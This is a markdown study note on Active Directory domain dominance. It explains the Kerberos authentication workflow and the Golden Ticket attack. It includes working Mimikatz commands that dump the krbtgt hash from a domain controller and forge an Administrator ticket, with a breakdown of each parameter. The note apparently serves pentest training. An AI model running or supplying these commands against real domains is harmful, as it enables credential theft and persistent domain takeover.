# Golden Ticket


## AD Domain Dominance

* more to AD than just the domain admin
* once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up
* abusing trust within domain, accross domains and forests and various attacks on kerberos


<br>

## kerberos

* kerberos is the basis of authentication in a AD environment
* constantly attacked since inception with new attacks every couple of years


### kerberos workflow

1. client --> DC/KDC
   * password converted to ntlm hash, a timestamp is encrypted with the hash and sent to kdc (AS-REQ)

2. DC/KDC --> client
   * the TGT is encrypted, signed and delivered to the user (AS-REP). only krbgt can open and read TGT data   ## TGT = Ticket Grants Ticket

3. client --> DC/KDC
   * TGT encrypted with krbgt hash when requesting a TGS ticket (TGS-REQ)   ## TGS = Ticket Granting Service 

4. DC/KDC --> client
   * TGS encrypted using target services ntlm hash (TGS-REP)

5. client --> application server
   * user connect to the server hosting the service on the appropriate port and presents the TGS (AP-REQ)

6. application server --> client
   * optional mutual authentication

7. application server --> DC/KDC
   * optional PAC valid request

8. DC/KDC --> application server
   * optional PAC validation response


* ntlm password hash for kerberos RC4 encryption
* logon ticket (TGT) provides user auth to DC
* kerberos policy only checked when TGT is created
* DC validates user account only when TGT > 20min
* service ticket (TGS) PAC validation is optional and rare
  * server LSASS sends PAC validation request to DC netlogon service (NRPC)
  * if it runs as a service, PAC validation is optional (disabled by default)
  * if a service runs as a System, it performs server signature verification on the PAC (computer account long term key)


<br>

## golden ticket

* golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket
* user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use deleted/revoked accounts
* the krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
* password change has no effect on this attack

* golden ticket happens during step 3 and 4 in the kerberos workflow above ^

* execute mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '''lsadump::lsa /patch''' -Computername dcserver
```

* on any machine
```powershell
Invoke-Mimikatz -Command '''kerberos::golden /User:Administrator /domain:sub.domain.local /sid:S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /krbtgt:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080  /ptt'''
```

* above command breakdown

kerberos::golden | name of module
/User:Administrator | username for which the TGT is generated
/domain:sub.domain.local | domain fqdn
/sid:S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx | SID of domain
/krbtgt:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | NTLM (RC4) hash of the krbtgt account. use /aes128 and /aes256 for using AES keys
/id:500 /groups:512 | optional user RID (default 500) and Group (default 513 512 520 518 519)
/ptt or /ticket | injects the ticket in current powershell process - no need to save the ticket on disk or saves ticket to a file for later use






































